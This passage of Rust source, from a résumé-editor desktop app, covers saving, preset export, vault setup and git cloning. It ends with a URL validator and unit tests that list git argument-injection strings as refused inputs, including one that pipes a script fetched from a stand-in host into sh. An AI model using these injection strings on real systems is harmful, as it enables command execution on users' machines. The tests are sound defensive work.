            VaultScreen::Applications => Screen::Applications,
        };
        cx.notify();
    }

    /// Write the editor's document out now, cancelling nothing and waiting for
    /// nothing. Every exit from the editor goes through here.
    ///
    /// Synchronous on purpose: the alternative is to await the pending task,
    /// and the pending task is a 600 ms timer we are trying to get *ahead* of.
    /// A CV is kilobytes of TOML — this is one small write, not a reason to
    /// build a handshake.
    pub(super) fn flush_editor(&mut self, editor: &Entity<Root>, cx: &mut Context<Self>) {
        let (path, undo, redo) = {
            let root = editor.read(cx);
            (
                root.doc_path.clone(),
                root.undo_stack.clone(),
                root.redo_stack.clone(),
            )
        };
        self.undo_histories.insert(path, (undo, redo));
        // Two statements, not one: `record` needs `cx` mutably and `read` holds
        // it immutably, and `flush_save` returning an owned `Result` is what
        // lets the first borrow end before the second begins.
        let (path, seen, result) = {
            let editor = editor.read(cx);
            (
                editor.doc_path.clone(),
                editor.seen_on_disk(),
                editor.flush_save(),
            )
        };
        let now = save_status::record_document(cx, &path, seen, result);
        editor.update(cx, |editor, _| editor.on_disk = now);
    }

    /// Write out whatever is open, whoever is asking.
    ///
    /// The quit and window-close hooks call this: they know the app is going
    /// away, not which screen happens to be up. Both the editor and the Preset
    /// Matrix hold a document that a debounce may not have written yet.
    pub fn flush_open_document(&mut self, cx: &mut Context<Self>) {
        match &self.screen {
            Screen::Editor(editor) => {
                let editor = editor.clone();
                self.flush_editor(&editor, cx);
            }
            Screen::PresetMatrix(pm) => {
                let result = vault::save(&pm.doc, &pm.path, pm.on_disk);
                let (path, seen) = (pm.path.clone(), pm.on_disk);
                let now = save_status::record_document(cx, &path, seen, result);
                if let Screen::PresetMatrix(pm) = &mut self.screen {
                    pm.on_disk = now;
                }
            }
            // Every other screen writes synchronously as it edits; there is no
            // pending state to lose.
            _ => {}
        }
    }

    /// Leave the Preset Matrix, back the way the user came in: to the editor
    /// if a document is open behind it, otherwise to the gallery whose badge
    /// opened it. `editing_path` is `Some` exactly while the editor holds a
    /// document (`BackToGallery` takes it), which is what makes it a reliable
    /// answer here rather than a guess.
    pub(super) fn leave_preset_matrix(&mut self, cx: &mut Context<Self>) {
        match self.editing_path.clone() {
            Some(path) => self.open_doc(path, cx),
            None => {
                self.screen = Screen::Gallery;
                cx.notify();
            }
        }
    }

    /// Open the Preset Matrix view for a document.
    pub(super) fn open_preset_matrix(&mut self, doc_path: PathBuf, cx: &mut Context<Self>) {
        if let Ok(doc) = vault::load(&doc_path) {
            let pm = super::preset_matrix::PresetMatrix::new(doc_path, doc);
            self.screen = Screen::PresetMatrix(Box::new(pm));
            // The evidence in the column headers, in the order it can be had:
            // the board is on disk and answers immediately, the page counts
            // need a compile each and arrive when they arrive.
            self.load_matrix_records();
            self.measure_matrix_pages(cx);
            cx.notify();
        }
    }

    /// Begin renaming the preset in column `idx`.
    ///
    /// `FieldId::PresetName` was addressable from the day presets existed and
    /// no view drew it, so a preset created as `Preset 2` kept that name for
    /// life (G-14). The gesture copies the editor's section rename — pen,
    /// inline field, Enter or clicking away commits — because a user who has
    /// renamed one should not have to learn a second way.
    pub(super) fn start_preset_rename(
        &mut self,
        idx: usize,
        window: &mut Window,
        cx: &mut Context<Self>,
    ) {
        let Screen::PresetMatrix(ref mut pm) = self.screen else {
            return;
        };
        let Some(current) = pm.doc.presets.get(idx).map(|p| p.name.clone()) else {
            return;
        };

        let field = cx.new(|cx| {
            let state = TextFieldState::single_line(window, cx);
            state.seed(current, window, cx);
            state
        });
        let subscription = cx.subscribe_in(
            &field,
            window,
            move |this, _state, event: &TextFieldEvent, window, cx| match event {
                TextFieldEvent::Submitted | TextFieldEvent::Blurred => {
                    this.commit_preset_rename(window, cx)
                }
                TextFieldEvent::Changed | TextFieldEvent::Focused => {}
            },
        );

        let handle = field.read(cx).focus_handle(cx);
        if let Screen::PresetMatrix(ref mut pm) = self.screen {
            pm.renaming_preset = Some(super::preset_matrix::PresetRename {
                idx,
                field,
                _subscription: subscription,
            });
        }
        handle.focus(window, cx);
        cx.notify();
    }

    /// Write the typed name back and close the control. A blank name is
    /// refused rather than stored: an unnamed preset is a column with no
    /// header, and the matrix has no other way to tell its columns apart.
    pub(super) fn commit_preset_rename(&mut self, _window: &mut Window, cx: &mut Context<Self>) {
        let Screen::PresetMatrix(ref mut pm) = self.screen else {
            return;
        };
        let Some(rename) = pm.renaming_preset.take() else {
            return;
        };
        let value = rename.field.read(cx).value(cx).trim().to_string();
        if !value.is_empty() {
            // Written through the addressing layer rather than at the field:
            // `FieldId::PresetName` has been addressable since presets existed
            // and reaching past it would leave the variant dead, which is how
            // a field ends up in the model and nowhere else (E-42).
            if let Some(slot) =
                crate::resume::edit::FieldId::PresetName(rename.idx).get_mut(&mut pm.doc)
            {
                *slot = value;
            }
            let result = vault::save(&pm.doc, &pm.path, pm.on_disk);
            let (path, seen) = (pm.path.clone(), pm.on_disk);
            pm.on_disk = save_status::record_document(cx, &path, seen, result);
            // What the board recorded was sent under the *old* name, and
            // history keeps the name it was sent under. So a rename usually
            // empties this column's record, and saying so beats carrying the
            // old count under a new heading.
            self.load_matrix_records();
        }
        cx.notify();
    }

    /// Save current section variant configuration in the Preset Matrix as a new preset.
    pub(super) fn save_matrix_as_preset(&mut self, cx: &mut Context<Self>) {
        let Screen::PresetMatrix(ref mut pm) = self.screen else {
            return;
        };
        // The same placeholder the editor hands out — see
        // `save_current_as_preset` for why it is "Version".
        let new_preset_name = format!("Version {}", pm.doc.presets.len() + 1);
        // The model captures the complete reading: custom-section variants,
        // visibility, order, and headings. Reassembling that here is how a new
        // preset quietly falls behind the next dimension the model gains.
        pm.doc.add_preset(new_preset_name);

        let result = vault::save(&pm.doc, &pm.path, pm.on_disk);
        let (path, seen) = (pm.path.clone(), pm.on_disk);
        pm.on_disk = save_status::record_document(cx, &path, seen, result);
        cx.notify();
        // A new column, with no evidence behind it until it is asked for.
        self.load_matrix_records();
        self.measure_matrix_pages(cx);
    }

    /// Step one of exporting every preset: choose the folder, then show what
    /// would be written into it.
    ///
    /// The folder comes first because a collision is a fact about a folder —
    /// there is no honest list of filenames to show until one is picked.
    pub(super) fn export_all_matrix_presets(&mut self, cx: &mut Context<Self>) {
        let Screen::PresetMatrix(pm) = &self.screen else {
            return;
        };
        if pm.doc.presets.is_empty() {
            save_status::record(
                cx,
                "export",
                Err("This document has no presets yet, so there is nothing to export.".to_string()),
            );
            return;
        }
        let receiver = cx.prompt_for_paths(pick_dir());

        cx.spawn(async move |this, cx| {
            let Some(folder) = first_path(receiver.await) else {
                return; // cancelled or dialog error
            };
            let _ = this.update(cx, |this, cx| {
                let Screen::PresetMatrix(pm) = &this.screen else {
                    return;
                };
                // `KeepBoth` is the default because it is the answer that
                // cannot lose somebody's file. Replacing is available, and it
                // is a thing the user has to say.
                let plan = plan_batch(
                    &pm.doc,
                    &folder,
                    "pdf",
                    &super::root_export_sheet::today(),
                    OnCollision::KeepBoth,
                );
                let ats_counts = (0..pm.doc.presets.len())
                    .map(|index| {
                        super::root_ats_lint::findings_for_view(&pm.doc, Some(index)).len()
                    })
                    .collect();
                this.batch_export = Some(BatchExportSheet {
                    folder,
                    on_collision: OnCollision::KeepBoth,
                    plan,
                    ats_counts,
                    writing: false,
                });
                cx.notify();
            });
        })
        .detach();
    }

    /// Step two: write the files the sheet listed, and only those.
    ///
    /// The compile happens off the main thread and returns the paths it actually
    /// wrote, which is the only thing export history may record — a history that
    /// points at a name a collision pushed aside is worse than none.
    pub(super) fn run_batch_export(&mut self, cx: &mut Context<Self>) {
        let Screen::PresetMatrix(pm) = &self.screen else {
            return;
        };
        let Some(sheet) = &mut self.batch_export else {
            return;
        };
        if sheet.writing {
            return;
        }
        sheet.writing = true;
        let doc = pm.doc.clone();
        let profiles = pm.profiles.clone();
        let folder = sheet.folder.clone();
        let plan = sheet.plan.clone();
        let executor = cx.background_executor().clone();
        cx.notify();

        cx.spawn(async move |this, cx| {
            let outcome = executor
                .spawn(async move {
                    let mut written: Vec<(String, PathBuf)> = Vec::new();
                    for step in &plan {
                        let mut preset_doc = doc.clone();
                        preset_doc.apply_preset(step.preset_index);
                        let source = crate::resume::template::generate_for_with_profiles(
                            &preset_doc,
                            &profiles,
                        );
                        let pdf_bytes = TypstEngine::new(source).compile_to_pdf()?;
                        std::fs::write(&step.destination.target, pdf_bytes).map_err(|e| {
                            format!("write to {} failed: {e}", step.destination.target.display())
                        })?;
                        written.push((step.preset.clone(), step.destination.target.clone()));
                    }
                    Ok::<Vec<(String, PathBuf)>, String>(written)
                })
                .await;

            let _ = this.update(cx, |this, cx| {
                this.batch_export = None;
                match outcome {
                    Ok(written) => {
                        log::info!("exported {} presets to {}", written.len(), folder.display());
                        if let Screen::PresetMatrix(pm) = &mut this.screen {
                            let now = chrono::Local::now();
                            let date = now.format("%Y-%m-%d").to_string();
                            let time = now.format("%H:%M").to_string();
                            for (preset, path) in &written {
                                pm.doc
                                    .record_export(&date, &time, "PDF", preset, path.clone());
                            }
                            let mut config = config::load();
                            config.remember_export_destination(&pm.path, &folder);
                            config::save(&config);
                            let result = vault::save(&pm.doc, &pm.path, pm.on_disk);
                            let (path, seen) = (pm.path.clone(), pm.on_disk);
                            pm.on_disk = save_status::record_document(cx, &path, seen, result);
                        }
                    }
                    Err(message) => {
                        // Some presets may already be on disk. Say so, rather
                        // than leaving a half-written folder and a silent log.
                        //
                        // The sheet closes on the way out either way: after a
                        // partial write its list is a description of a folder
                        // that no longer exists, and asking again re-plans
                        // against what is actually there now.
                        log::error!("batch export to {} failed: {message}", folder.display());
                        save_status::record(cx, "export", Err(message));
                    }
                }
                cx.notify();
            });
        })
        .detach();
    }

    /// Start renaming `path`, seeding the box with its current file name.
    pub(super) fn start_rename(
        &mut self,
        path: PathBuf,
        window: &mut Window,
        cx: &mut Context<Self>,
    ) {
        let stem = path
            .file_stem()
            .map(|s| s.to_string_lossy().to_string())
            .unwrap_or_default();
        if let Some(field) = self.rename_field.clone() {
            field.update(cx, |state, cx| state.seed(&stem, window, cx));
        }
        self.renaming_doc = Some(path);
        cx.notify();
    }

    pub(super) fn cancel_rename(&mut self, cx: &mut Context<Self>) {
        self.renaming_doc = None;
        cx.notify();
    }

    /// Apply the rename. A failure (name taken, empty) leaves the box open
    /// with the reason showing, rather than closing and losing what was typed.
    pub(super) fn commit_rename(&mut self, _window: &mut Window, cx: &mut Context<Self>) {
        let (Some(path), Some(field)) = (self.renaming_doc.clone(), self.rename_field.clone())
        else {
            return;
        };
        let name = field.read(cx).value(cx).trim().to_string();
        match vault::rename_document(&path, &name) {
            Ok(new_path) => {
                // Measurements are keyed by path, so they move across rather
                // than the renamed document's rows going briefly blank.
                let moved: Vec<((PathBuf, Option<String>), PageGeometry)> = self
                    .reading_pages
                    .keys()
                    .filter(|(p, _)| *p == path)
                    .cloned()
                    .filter_map(|key| {
                        let geometry = *self.reading_pages.get(&key)?;
                        Some(((new_path.clone(), key.1.clone()), geometry))
                    })
                    .collect();
                self.reading_pages.retain(|(p, _), _| *p != path);
                self.reading_pages.extend(moved);
                self.renaming_doc = None;
                self.setup_error = None;
            }
            Err(message) => self.setup_error = Some(message),
        }
        cx.notify();
    }

    /// Create a new document from a template and open it.
    pub(super) fn create_doc(&mut self, doc: ResumeDoc, base: &str, cx: &mut Context<Self>) {
        let Some(vault) = self.vault.clone() else {
            return;
        };
        match vault::create_document(&vault, &doc, base) {
            Ok(path) => {
                self.gallery_creating = false;
                self.open_doc(path, cx);
            }
            Err(message) => {
                self.setup_error = Some(message);
                cx.notify();
            }
        }
    }

    /// Prompt for a file (PDF, DOCX, JSON, TXT) and import it as a new CV.
    pub(super) fn import_existing_resume(&mut self, cx: &mut Context<Self>) {
        self.setup_error = None;
        let prompt = PathPromptOptions {
            files: true,
            directories: false,
            multiple: false,
            prompt: Some("Select Resume File (PDF, DOCX, JSON, TXT)".into()),
        };
        let receiver = cx.prompt_for_paths(prompt);
        let executor = cx.background_executor().clone();

        cx.spawn(async move |this, cx| {
            let Some(file_path) = first_path(receiver.await) else {
                return;
            };
            let filename = file_path
                .file_name()
                .map(|f| f.to_string_lossy().to_string())
                .unwrap_or_else(|| "resume".to_string());
            let failed_name = filename.clone();
            let _ = this.update(cx, |this, cx| {
                this.import_step = ImportStep::Parsing { filename };
                cx.notify();
            });
            let result = executor
                .spawn(async move { crate::import::import_file(&file_path) })
                .await;
            let _ = this.update(cx, |this, cx| match result {
                Ok(imported) => {
                    this.import_step = ImportStep::Step2Review {
                        imported: Box::new(imported),
                    };
                    cx.notify();
                }
                // A step, not a string dropped on the drop zone: the drop zone
                // never rendered `setup_error`, so a failed import bounced back
                // to the start with nothing said at all.
                Err(error) => {
                    this.import_step = ImportStep::CouldNotRead {
                        filename: failed_name,
                        error: Box::new(error),
                    };
                    cx.notify();
                }
            });
        })
        .detach();
    }

    /// Create a new `cvault` inside a user-chosen folder.
    pub(super) fn create_new_vault(&mut self, cx: &mut Context<Self>) {
        self.setup_error = None;
        let receiver = cx.prompt_for_paths(pick_dir());
        cx.spawn(async move |this, cx| {
            let Some(parent) = first_path(receiver.await) else {
                return;
            };
            let _ = this.update(cx, |this, cx| match vault::create_vault(&parent) {
                Ok(dir) => this.open_vault(dir, cx),
                Err(message) => {
                    this.setup_error = Some(message);
                    cx.notify();
                }
            });
        })
        .detach();
    }

    /// Open an existing vault folder.
    pub(super) fn open_existing_vault(&mut self, window: &mut Window, cx: &mut Context<Self>) {
        self.setup_error = None;
        let receiver = cx.prompt_for_paths(pick_dir());
        cx.spawn_in(window, async move |this, cx| {
            let Some(dir) = first_path(receiver.await) else {
                return;
            };
            let _ = this.update_in(cx, |this, window, cx| {
                if !vault::is_vault(&dir) {
                    this.setup_error = Some("That is not a folder.".into());
                    cx.notify();
                    return;
                }
                // `is_vault` only asks whether it is a directory, which is why
                // picking `~/` used to be accepted in silence — after which the
                // gallery parsed every unrelated `.toml` on the machine and drew
                // the failures as cards reading "unreadable file".
                match vault::vault_shape(&dir) {
                    vault::VaultShape::Unrecognized { stray_toml } => {
                        let detail = if stray_toml == 0 {
                            "Nothing in it looks like a CV, a block library or a diary.".to_string()
                        } else {
                            format!(
                                "It holds {stray_toml} .toml file{} and none of them is a CV. \
                                 DockCV would list every one of them as an unreadable document.",
                                if stray_toml == 1 { "" } else { "s" }
                            )
                        };
                        // Not refused outright: it is the user's disk, and a
                        // vault restored from a backup can look like anything.
                        // But it is asked about, and the answer is No by
                        // default.
                        confirm::destructive(
                            "That folder doesn't look like a vault.".into(),
                            detail,
                            "Use It Anyway",
                            window,
                            cx,
                            move |this, _window, cx| this.adopt_vault(dir, cx),
                        );
                    }
                    _ => this.adopt_vault(dir, cx),
                }
            });
        })
        .detach();
    }

    /// Take a folder as the vault, and leave a marker saying so.
    ///
    /// The marker is what lets the folder answer for itself next time instead
    /// of being re-classified by its contents — and what makes an intentionally
    /// odd vault stop asking after the first time.
    fn adopt_vault(&mut self, dir: PathBuf, cx: &mut Context<Self>) {
        vault::mark_as_vault(&dir);
        self.open_vault(dir, cx);
    }

    /// Clone a vault from a git URL on the clipboard into a chosen folder.
    pub(super) fn clone_from_git(&mut self, cx: &mut Context<Self>) {
        let url = cx
            .read_from_clipboard()
            .and_then(|item| item.text())
            .map(|s| s.trim().to_string())
            .filter(|s| looks_like_git_url(s));

        let Some(url) = url else {
            self.setup_error = Some("Copy a git repository URL to the clipboard first.".into());
            cx.notify();
            return;
        };

        self.setup_error = None;
        let receiver = cx.prompt_for_paths(pick_dir());
        let executor = cx.background_executor().clone();
        cx.spawn(async move |this, cx| {
            let Some(parent) = first_path(receiver.await) else {
                return;
            };
            let result = executor
                .spawn(async move { git_clone(&url, &parent) })
                .await;
            let _ = this.update(cx, |this, cx| match result {
                Ok(dir) => this.open_vault(dir, cx),
                Err(message) => {
                    this.setup_error = Some(message);
                    cx.notify();
                }
            });
        })
        .detach();
    }

    /// The shared gradient backdrop used by full-screen entry screens.
    pub(super) fn backdrop(&self, cx: &App) -> gpui::Div {
        let theme = cx.theme();
        div()
            .size_full()
            .flex()
            .items_center()
            .justify_center()
            .bg(linear_gradient(
                165.0,
                linear_color_stop(theme.background, 0.0),
                linear_color_stop(theme.hover, 1.0),
            ))
    }

    /// Wrap content in a fade + gentle slide-up entrance.
    pub(super) fn fade_in(&self, id: &'static str, content: gpui::Div) -> impl IntoElement {
        content.with_animation(
            id,
            Animation::new(Duration::from_millis(650)).with_easing(ease_out_quint()),
            |el, delta| el.opacity(delta).mt(px((1.0 - delta) * 18.0)),
        )
    }
}

impl Render for Shell {
    fn render(&mut self, window: &mut Window, cx: &mut Context<Self>) -> impl IntoElement {
        self.ensure_inputs(window, cx);
        self.ensure_vault_watch(window, cx);
        // Before anything draws. Every screen below reads `self.cache` rather
        // than the disk, so this one call is the whole of the vault I/O in a
        // frame — and it does nothing at all unless the directory moved.
        let revision = save_status::vault_revision(cx);
        self.cache.refresh(self.vault.as_deref(), revision);
        if let Screen::PresetMatrix(pm) = &mut self.screen {
            if &pm.profiles != self.cache.profiles() {
                pm.profiles = self.cache.profiles().clone();
            }
        }
        // The update settings, read once a launch, and the weekly check if it
        // is due. Not on the pre-vault screens: somebody's first thirty
        // seconds with this app are not the moment to mention versions of it.
        if !matches!(
            self.screen,
            Screen::Opening | Screen::Welcome | Screen::Setup
        ) {
            self.start_update_checks(cx);
        }
        if matches!(self.screen, Screen::Gallery) {
            self.ensure_reading_pages(cx);
        }

        // The vault's screens are **tabs of one window, not separate pages** —
        // the rail stays put and only the main pane changes, which is how the
        // mockup draws every one of them (each row's digest opens with the
        // same `@@ sidebar` block). That is also why none of these screens
        // draws a back control any more: the rail *is* the way back.
        //
        // Outside the chrome: Welcome/Setup (pre-vault, full-bleed), the
        // Editor (its own 46px titlebar, the editor spec §3) and the
        // Preset Matrix (document-scoped, reached from a document and drawn
        // with a breadcrumb rather than the rail — see its own design row).
        let body = match &self.screen {
            // Deliberately empty. This state lasts a frame or two; anything
            // drawn in it would be a flicker, and a spinner for work that is
            // usually instant teaches the user to expect a wait.
            Screen::Opening => self.backdrop(cx).into_any_element(),
            Screen::Welcome => self.render_welcome(cx).into_any_element(),
            Screen::Setup => self.render_setup(cx).into_any_element(),
            Screen::Editor(editor) => editor.clone().into_any_element(),
            Screen::PresetMatrix(pm) => pm.render_matrix(cx).into_any_element(),

            // Import keeps the rail, like every other vault screen.
            //
            // It used to take the whole window as a modal, for a reason that
            // was true of the surface it had: a 560px card inside the
            // gallery's scroll, with the grid competing behind it. The fix was
            // to stop being a card — `import_screen.rs` is the pane — and once
            // it is the pane there is nothing left for the rail to compete
            // with, and no reason for this one flow to be the screen where the
            // product's own furniture disappears.
            Screen::Gallery => {
                let main = self.render_gallery_main(cx).into_any_element();
                self.with_rail(main, window, cx)
            }
            Screen::Library => {
                let main = slide_in("enter-library", self.render_library_screen(cx));
                self.with_rail(main, window, cx)
            }
            Screen::Diary => {
                let main = slide_in("enter-diary", self.render_diary_screen(cx));
                self.with_rail(main, window, cx)
            }
            Screen::Applications => {
                let main = slide_in("enter-applications", self.render_applications_screen(cx));
                self.with_rail(main, window, cx)
            }
        };

        div()
            .size_full()
            // `relative` so the notice can be an overlay: a vault problem is
            // reported without moving anything the user is looking at.
            .relative()
            .bg(cx.theme().background)
            .text_color(cx.theme().text)
            .child(body)
            // Over the matrix, and above the body so the list of files it is
            // about is behind it rather than beside it.
            .children(
                self.batch_export
                    .is_some()
                    .then(|| self.render_batch_export_sheet(cx)),
            )
            // Drawn once, here, rather than per screen — this is the outermost
            // element in the app, so one call covers the gallery, the library,
            // the diary, the board, the matrix *and* the editor.
            .children(save_status::banner(cx))
    }
}

/// Options for a single-folder picker.
pub(super) fn pick_dir() -> PathPromptOptions {
    PathPromptOptions {
        files: false,
        directories: true,
        multiple: false,
        prompt: None,
    }
}

/// Extract the first chosen path from a picker result.
fn first_path<E>(result: Result<gpui::Result<Option<Vec<PathBuf>>>, E>) -> Option<PathBuf> {
    match result {
        Ok(Ok(Some(mut paths))) if !paths.is_empty() => Some(paths.remove(0)),
        _ => None,
    }
}

/// Wrap a secondary screen in a subtle fade + slide-in entrance.
/// Split a `# tag` box into stored tags: `#` is decoration, separators are
/// whatever the user reached for. Deduplicated, because a tag applied twice to
/// one entry is a typo, not two facts.
pub(super) fn parse_tags(raw: &str) -> Vec<String> {
    let mut tags: Vec<String> = Vec::new();
    for tag in raw
        .split([',', ' ', '\t'])
        .map(|t| t.trim().trim_start_matches('#').trim())
        .filter(|t| !t.is_empty())
    {
        let tag = tag.to_lowercase();
        if !tags.contains(&tag) {
            tags.push(tag);
        }
    }
    tags
}

fn slide_in(id: &'static str, content: gpui::Div) -> AnyElement {
    content
        .with_animation(
            id,
            Animation::new(Duration::from_millis(240)).with_easing(ease_out_quint()),
            |el, delta| el.opacity(delta).ml(px((1.0 - delta) * 16.0)),
        )
        .into_any_element()
}

pub(super) fn remove_at<T>(items: &mut Vec<T>, index: usize) {
    if index < items.len() {
        items.remove(index);
    }
}

/// The transports `git clone` may be pointed at.
///
/// A whitelist, and that is the entire point. The previous check — *ends with
/// `.git`, or starts with `git@`, or starts with `http`* — was a shape test, and
/// git accepts strings that pass it and are not addresses at all:
///
/// * `ext::sh -c 'curl … | sh' #.git` ends with `.git`. Git's `ext::` transport
///   treats the rest as a **shell command to run**.
/// * `--template=/tmp/evil.git` also ends with `.git`, and git parses a leading
///   `-` as an option wherever it appears. `--template` copies hooks into the
///   new repository, and clone runs `post-checkout`.
///
/// Both arrive through the clipboard, which is not a trusted channel: the user
/// pressed "Clone from Git", they did not vouch for whatever they last copied.
const ALLOWED_SCHEMES: [&str; 5] = ["https://", "http://", "ssh://", "git://", "file://"];

/// Whether `url` is an address DockCV is willing to hand to `git clone`.
fn looks_like_git_url(url: &str) -> bool {
    // An argument, not an address — checked first, because every other rule
    // below is about the *content* of an address and this one is about git's
    // option parser.
    if url.starts_with('-') || url.is_empty() {
        return false;
    }
    // Whitespace would be one argument to us and several to a transport helper.
    if url.chars().any(char::is_whitespace) {
        return false;
    }

    if let Some(rest) = ALLOWED_SCHEMES
        .iter()
        .find_map(|scheme| url.strip_prefix(scheme))
    {
        return !rest.is_empty();
    }

    // scp-like: `[user@]host:path`. Accepted because it is what GitHub's own
    // "SSH" button copies. The colon must come before any slash, or
    // `https://…` typo'd as `https:/…` would land here.
    if url.contains("://") {
        return false;
    }
    match url.split_once(':') {
        Some((host, path)) => {
            !host.is_empty()
                && !path.is_empty()
                && !host.contains('/')
                // `ext::`, `transport::…` and friends: a second colon straight
                // after the first is a scheme separator, not a host/path one.
                && !path.starts_with(':')
        }
        None => false,
    }
}

/// The directory name to clone into, derived from the URL's last segment.
///
/// Returns `None` rather than a fallback when the segment is not a plain name:
/// `parent.join("..")` walks out of the folder the user picked, and silently
/// cloning somewhere they did not choose is worse than saying no.
fn repo_name(url: &str) -> Option<String> {
    let name = url
        .trim_end_matches('/')
        .rsplit(['/', ':'])
        .next()
        .unwrap_or_default()
        .trim_end_matches(".git");

    let plain = !name.is_empty()
        && name != "."
        && name != ".."
        && !name.contains('/')
        && !name.contains('\\')
        && !name.starts_with('-');
    plain.then(|| name.to_string())
}

fn git_clone(url: &str, parent: &Path) -> Result<PathBuf, String> {
    // Re-checked here rather than trusted from the caller: this function is the
    // one that starts a process, so it is the one that has to be sure.
    if !looks_like_git_url(url) {
        return Err("that doesn't look like a repository address".to_string());
    }
    let name = repo_name(url).ok_or("couldn't work out a folder name from that address")?;
    let dest = parent.join(&name);
    if dest.exists() {
        return Err(format!("“{name}” already exists in that folder"));
    }

    let mut cmd = std::process::Command::new("git");
    cmd
        // No credential helper and no terminal prompt. Without these, a private
        // or mistyped URL leaves `status()` blocked on input that can never
        // arrive — the app is not attached to a terminal — and the Setup screen
        // hangs with no way out. Failing fast is the only honest option, since
        // there is nowhere here to type a password.
        .env("GIT_TERMINAL_PROMPT", "0")
        .env("GIT_ASKPASS", "")
        .env("SSH_ASKPASS", "")
        .arg("-c")
        .arg("credential.helper=")
        .arg("clone")
        // Everything after this is an operand. Belt to `looks_like_git_url`'s
        // braces: even if a leading `-` ever gets past the check, git will read
        // it as an address rather than an option.
        .arg("--")
        .arg(url)
        .arg(&dest);
    #[cfg(target_os = "windows")]
    {
        use std::os::windows::process::CommandExt;
        cmd.creation_flags(0x08000000);
    }
    let status = cmd
        .status()
        .map_err(|e| format!("could not run git: {e}"))?;
    if !status.success() {
        return Err(format!("git clone failed ({status})"));
    }
    Ok(dest)
}

#[cfg(test)]
mod clone_url_tests {
    use super::{looks_like_git_url, repo_name};

    /// The addresses a user actually copies out of GitHub, GitLab and a
    /// self-hosted box. If any of these stopped working the feature would be
    /// dead, so they are pinned first.
    #[test]
    fn ordinary_repository_addresses_are_accepted() {
        for url in [
            "https://github.com/iamzeelex/dockcv.git",
            "https://github.com/iamzeelex/dockcv",
            "http://git.internal.example/cv.git",
            "git@github.com:iamzeelex/dockcv.git",
            "ssh://git@github.com/iamzeelex/dockcv.git",
            "git://git.example.org/cv.git",
            "file:///Users/me/backups/cvault.git",
        ] {
            assert!(looks_like_git_url(url), "should be accepted: {url}");
        }
    }

    /// Each of these passed the old shape test — *ends with `.git`, or starts
    /// with `git@`, or starts with `http`* — and none of them is an address.
    #[test]
    fn strings_that_are_arguments_or_commands_are_refused() {
        for url in [
            // Git parses a leading `-` as an option wherever it appears.
            // `--template` copies hooks in, and clone runs `post-checkout`.
            "--template=/tmp/evil.git",
            "--upload-pack=touch /tmp/pwned",
            "-c core.pager=sh",
            // `ext::` hands the rest to a shell. The `#.git` suffix is there
            // purely to satisfy a check that only looked at the end.
            "ext::sh -c 'curl evil.example|sh' #.git",
            "ext::sh -c whoami",
            // Whitespace splits into several arguments downstream.
            "https://example.com/a b.git",
            // Not an address at all.
            "",
            "just some copied text",
            "https://",
            "host:",
            ":path",
        ] {
            assert!(!looks_like_git_url(url), "should be refused: {url:?}");
        }
    }

    #[test]
    fn the_folder_name_comes_from_the_last_segment() {
        assert_eq!(
            repo_name("https://github.com/iamzeelex/dockcv.git").as_deref(),
            Some("dockcv")
        );
        assert_eq!(
            repo_name("git@github.com:aeinstein/my-cvault").as_deref(),
            Some("my-cvault")
        );
        assert_eq!(repo_name("https://example.com/cv/").as_deref(), Some("cv"));
    }

    /// A name that would climb out of the folder the user picked is refused
    /// rather than replaced with a fallback: cloning somewhere they did not
    /// choose is worse than not cloning.
    #[test]
    fn a_traversing_or_empty_name_is_refused() {
        assert_eq!(repo_name("https://example.com/foo/.."), None);
        assert_eq!(repo_name("https://example.com/foo/."), None);
        assert_eq!(repo_name("file:///"), None);
    }
}
